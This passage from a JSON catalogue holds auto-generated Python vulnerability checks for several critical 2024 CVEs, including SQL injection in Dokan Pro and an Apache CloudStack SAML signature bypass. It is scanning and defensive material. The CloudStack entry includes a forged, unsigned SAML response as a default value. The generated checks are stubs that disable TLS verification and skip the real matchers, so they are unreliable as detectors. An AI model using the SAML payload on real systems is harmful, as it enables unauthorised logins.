matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TurboMeeting - Boolean-based SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_38289(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "sqli",
          "turbomeeting",
          "vkev",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_3922",
        "name": "Dokan Pro <= 3.10.3 - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The Dokan Pro plugin for WordPress is vulnerable to SQL Injection via the 'code' parameter in all versions up to, and including, 3.10.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.",
        "severity": "critical",
        "detection": "[OR] mot(s) 'Dokan product' / [OR] DSL: duration>=6; status_code == 302",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-3922\nName: Dokan Pro <= 3.10.3 - SQL Injection\nSeverity: critical\nDescription: The Dokan Pro plugin for WordPress is vulnerable to SQL Injection via the 'code' parameter in all versions up to, and including, 3.10.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_3922:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-3922\"\n    SEVERITY = \"critical\"\n    NAME = \"Dokan Pro <= 3.10.3 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'Dokan product' / [OR] DSL: duration>=6; status_code == 302\"\n\n        # Simple word matcher simulation\n        matchers = ['Dokan product']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dokan Pro <= 3.10.3 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_3922(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-3922\nName: Dokan Pro <= 3.10.3 - SQL Injection\nSeverity: critical\nDescription: The Dokan Pro plugin for WordPress is vulnerable to SQL Injection via the 'code' parameter in all versions up to, and including, 3.10.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_3922:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-3922\"\n    SEVERITY = \"critical\"\n    NAME = \"Dokan Pro <= 3.10.3 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'Dokan product' / [OR] DSL: duration>=6; status_code == 302\"\n\n        # Simple word matcher simulation\n        matchers = ['Dokan product']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Dokan Pro <= 3.10.3 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_3922(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "time-based-sqli",
          "cve",
          "cve2024",
          "dokan",
          "wp-plugin",
          "wordpress",
          "wp",
          "dokan-pro",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_41107",
        "name": "Apache CloudStack - SAML Signature Exclusion",
        "language": "Python",
        "famille": "CVE",
        "description": "The CloudStack SAML authentication (disabled by default) does not enforce signature check. In CloudStack environments where SAML authentication is enabled, an attacker that initiates CloudStack SAML single sign-on authentication can bypass SAML authentication by submitting a spoofed SAML response with no signature and known or guessed username and other user details of a SAML-enabled CloudStack user-account",
        "severity": "critical",
        "detection": "[AND] DSL: contains(header,'sessionkey'); contains(content_type,'text/xml')",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "root_url",
            "datatype": "string",
            "required": false,
            "description": "URL racine sans chemin"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "{{username}}"
          },
          {
            "name": "entityid",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: entityid",
            "default": "{{entityid}}"
          },
          {
            "name": "saml_id",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: saml_id",
            "default": "{{saml_id}}"
          },
          {
            "name": "saml",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: saml",
            "default": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><samlp:Response Destination=\"{{RootURL}}/client/api?command=samlSso\"    ID=\"_b0389fca0ea65fe8e857\" InResponseTo=\"{{saml_id}}\"    IssueInstant=\"2024-07-30T10:48:20.307Z\" Version=\"2.0\"    xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">    <saml:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\"        xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">{{entityid}}</saml:Issuer>    <samlp:Status xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">        <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\" />    </samlp:Status>    <saml:Assertion ID=\"_7a2993514112bbc72696\" IssueInstant=\"2024-07-30T10:58:20.307Z\" Version=\"2.0\"        xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"        xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">        <saml:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\"            xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">{{entityid}}</saml:Issuer>        <saml:Conditions NotBefore=\"2024-07-30T10:43:20.307Z\"            NotOnOrAfter=\"2024-07-30T10:53:20.307Z\"            xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"><saml:AudienceRestriction>                <saml:Audience>org.apache.cloudstack</saml:Audience>            </saml:AudienceRestriction>        </saml:Conditions>        <saml:AuthnStatement AuthnInstant=\"2024-07-30T10:48:20.307Z\"            SessionIndex=\"{{saml_id}\"            xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">            <saml:AuthnContext>                <saml:AuthnContextClassRef>                    urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>            </saml:AuthnContext>        </saml:AuthnStatement>        <saml:AttributeStatement xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">            <saml:Attribute Name=\"uid\"                NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified\">                <saml:AttributeValue xmlns:xs=\"http://www.w3.org/2001/XMLSchema\"                    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xs:string\">{{username}}</saml:AttributeValue>            </saml:Attribute>                    </saml:AttributeStatement>    </saml:Assertion></samlp:Response>"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-41107\nName: Apache CloudStack - SAML Signature Exclusion\nSeverity: critical\nDescription: The CloudStack SAML authentication (disabled by default) does not enforce signature check. In CloudStack environments where SAML authentication is enabled, an attacker that initiates CloudStack SAML single sign-on authentication can bypass SAML authentication by submitting a spoofed SAML response with no signature and known or guessed username and other user details of a SAML-enabled CloudStack user-account\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_41107:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-41107\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache CloudStack - SAML Signature Exclusion\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains(header,'sessionkey'); contains(content_type,'text/xml')\"\n\n        # Simple word matcher simulation\n        matchers = ['sessionkey', 'text/xml']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache CloudStack - SAML Signature Exclusion\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_41107(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-41107\nName: Apache CloudStack - SAML Signature Exclusion\nSeverity: critical\nDescription: The CloudStack SAML authentication (disabled by default) does not enforce signature check. In CloudStack environments where SAML authentication is enabled, an attacker that initiates CloudStack SAML single sign-on authentication can bypass SAML authentication by submitting a spoofed SAML response with no signature and known or guessed username and other user details of a SAML-enabled CloudStack user-account\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_41107:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-41107\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache CloudStack - SAML Signature Exclusion\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains(header,'sessionkey'); contains(content_type,'text/xml')\"\n\n        # Simple word matcher simulation\n        matchers = ['sessionkey', 'text/xml']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache CloudStack - SAML Signature Exclusion\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_41107(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "apache",
          "cloudstack",
          "auth-bypass",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_4358",
        "name": "Progress Telerik Report Server - Authentication Bypass",
        "language": "Python",
        "famille": "CVE",
        "description": "In Progress Telerik Report Server, version 2024 Q1 (10.0.24.305) or earlier, on IIS, an unauthenticated attacker can gain access to Telerik Report Server restricted functionality via an authentication bypass vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(content_type_2, \"application/json\"); contains_all(body_2, \"access_token\", \"userName\", \"token_type\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "user",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: user",
            "default": "{{rand_base(6)}}"
          },
          {
            "name": "pass",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: pass",
            "default": "{{rand_base(8)}}"
          },
          {
            "name": "email",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: email",
            "default": "{{randstr}}@{{rand_base(5)}}.com"
          },
          {
            "name": "firstname",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: firstname",
            "default": "{{rand_base(5)}}"
          },
          {
            "name": "lastname",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: lastname",
            "default": "{{rand_base(5)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
